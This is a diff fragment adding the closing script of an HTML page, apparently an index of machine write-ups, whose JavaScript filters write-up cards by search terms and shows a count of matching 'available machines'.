+            //     const cards = document.querySelectorAll('.writeup-card');
+            //     const searchInput = document.getElementById('searchInput');
+            //     if (!searchInput) return;
+            //     searchInput.addEventListener('input', () => {
+            //         const terms = searchInput.value
+            //             .toLowerCase()
+            //             .trim()
+            //             .split(/\s+/);
+            //         cards.forEach(card => {
+            //             const categories = (card.dataset.categories || "").toLowerCase();
+            //             const title = card.querySelector("h2").textContent.toLowerCase();
+            //             const haystack = `${categories} ${title}`.replace(/\s+/g, " ");
+            //             const matches = terms.every(t => haystack.includes(t));
+            //             card.classList.toggle("hidden", !matches);
+            //         });
+            //     });
+            // });
+
+            document.addEventListener("DOMContentLoaded", () => {
+                const cards = document.querySelectorAll('.writeup-card');
+                const searchInput = document.getElementById('searchInput');
+                const resultsCount = document.getElementById('resultsCount');
+
+                function updateCount() {
+                    const visible = document.querySelectorAll(".writeup-card:not(.hidden)").length;
+                    if (resultsCount) {
+                        resultsCount.textContent = `${visible} available machines`;
+                    }
+                }
+
+                if (!searchInput) return;
+
+                searchInput.addEventListener('input', () => {
+                    const terms = searchInput.value
+                        .toLowerCase()
+                        .trim()
+                        .split(/\s+/);
+
+                    cards.forEach(card => {
+                        const categories = (card.dataset.categories || "").toLowerCase();
+                        const title = card.querySelector("h2").textContent.toLowerCase();
+                        const haystack = `${categories} ${title}`.replace(/\s+/g, " ");
+
+                        const matches = terms.every(t => haystack.includes(t));
+                        card.classList.toggle("hidden", !matches);
+                    });
+
+                    updateCount();
+                });
+
+                updateCount();
+            });
+
+        </script>
+    </body>
+</html>
